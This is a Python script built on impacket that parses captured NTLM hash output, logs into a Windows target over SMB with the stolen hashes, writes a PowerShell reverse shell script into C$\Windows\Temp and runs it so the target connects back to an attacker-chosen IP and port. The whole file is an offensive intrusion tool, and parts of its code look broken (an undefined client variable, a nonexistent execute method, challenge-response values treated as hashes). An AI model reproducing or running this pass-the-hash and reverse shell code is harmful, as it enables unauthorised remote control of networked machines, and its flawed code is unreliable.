import argparse
import io
from impacket.smbconnection import SMBConnection

def parse_hash_file(file_path):
    print(f"Parsing hash file: {file_path}")
    credentials = []
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
            print(f"Total lines read from file: {len(lines)}")

            for i in range(len(lines)):
                line = lines[i].strip()
                print(f"Processing line: {line}")

                if 'authenticated successfully' in line:
                    parts = line.split()
                    user_info = parts[2]  # LACHINGONA\gris
                    domain, username = user_info.split('\\')
                    print(f"Extracted domain: {domain}, username: {username}")

                    if i + 1 < len(lines):
                        hash_line = lines[i + 1].strip()
                        if '::' in hash_line:
                            hash_parts = hash_line.split(':')
                            if len(hash_parts) >= 5:
                                lmhash = hash_parts[4]
                                nthash = hash_parts[5]
                                print(f"Extracted hashes - LMHash: {lmhash}, NTHash: {nthash}")

                                try:
                                    bytes.fromhex(lmhash)
                                    bytes.fromhex(nthash)
                                    credentials.append((username, domain, lmhash, nthash))
                                    print(f"Added credentials: {username}, {domain}, {lmhash}, {nthash}")
                                except ValueError:
                                    print(f"Invalid hash format in line: {hash_line}")
                            else:
                                print(f"Hash line does not contain expected number of parts: {hash_line}")
                        else:
                            print(f"Hash line does not contain '::': {hash_line}")
                    else:
                        print("No subsequent line found for hashes.")
                        
            print(f"Found {len(credentials)} valid credentials")
            return credentials
    except Exception as e:
        print(f"Failed to parse hash file: {e}")
        return []

def reverse_shell(target_ip, username, domain, lmhash, nthash, callback_ip, callback_port):
    try:
        print(f"\nConnecting to SMB service on {target_ip} with the following parameters:")
        print(f"  Username: {username}")
        print(f"  Domain: {domain}")
        print(f"  LMHash: {lmhash}")
        print(f"  NTHash: {nthash}")
        print(f"  Callback IP: {callback_ip}")
        print(f"  Callback Port: {callback_port}")

        conn = SMBConnection(target_ip, target_ip)

        # Convertir los hashes de cadena a bytes
        lmhash_bytes = bytes.fromhex(lmhash)
        nthash_bytes = bytes.fromhex(nthash)

        print(f"LMHash Bytes: {lmhash_bytes}")
        print(f"NTHash Bytes: {nthash_bytes}")

        print(f"Logging in using NTLM hashes username: {username} domain:{domain} lmhash: {lmhash} nthash: {nthash}")

        conn.login(username, '', '192.168.1.87', lmhash_bytes, nthash_bytes)

        # Construye el comando de reverse shell
        command = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command " \
                  f"New-Object System.Net.Sockets.TCPClient('{callback_ip}',{callback_port});" \
                  f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};" \
                  f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;" \
                  f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" \
                  f"$sendback = (iex $data 2>&1 | Out-String );" \
                  f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';" \
                  f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" \
                  f"$stream.Write($sendbyte,0,$sendbyte.Length);" \
                  f"$stream.Flush()}}; $client.Close()"

        command_bytes = command.encode('utf-8')

        # Guardar el script en el servidor
        print("Creating directory on target")
        conn.createDirectory('C$', 'Windows\\Temp\\')

        print("Uploading reverse shell script")
        with io.BytesIO(command_bytes) as script_file:
            conn.putFile('C$', 'Windows\\Temp\\reverse_shell.ps1', script_file)

        print("Executing reverse shell script")
        conn.executeCommand('powershell.exe', '-File C:\\Windows\\Temp\\reverse_shell.ps1')

        print(f"Reverse shell command sent to {target_ip}. Connect to {callback_ip}:{callback_port} to get a shell.")
    except Exception as e:
        print(f"Failed to send reverse shell command: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send reverse shell command using NTLMv2 hash from a file.")
    parser.add_argument('--target-ip', required=True, help="Target IP address")
    parser.add_argument('--hash-file', required=True, help="File containing usernames and NTLMv2 hashes")
    parser.add_argument('--callback-ip', required=True, help="Callback IP address")
    parser.add_argument('--callback-port', required=True, help="Callback port")

    args = parser.parse_args()

    print(f"Target IP: {args.target_ip}")
    print(f"Hash File: {args.hash_file}")
    print(f"Callback IP: {args.callback_ip}")
    print(f"Callback Port: {args.callback_port}")

    credentials = parse_hash_file(args.hash_file)

    if not credentials:
        print("No valid credentials found. Exiting.")
    else:
        print(f"Valid credentials found: {credentials}")
        for username, domain, lmhash, nthash in credentials:
            print(f"\nAttempting reverse shell with:")
            print(f"  Username: {username}")
            print(f"  Domain: {domain}")
            print(f"  LMHash: {lmhash}")
            print(f"  NTHash: {nthash}")
            reverse_shell(args.target_ip, username, domain, lmhash, nthash, args.callback_ip, args.callback_port)
